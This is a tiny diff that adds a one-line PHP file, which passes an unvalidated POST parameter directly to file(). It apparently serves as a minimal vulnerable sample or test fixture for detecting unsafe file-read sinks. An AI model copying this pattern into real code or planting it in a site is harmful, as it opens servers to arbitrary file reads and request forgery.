@@ -1,0 +1,1 @@
+<?php file($_POST[0]);
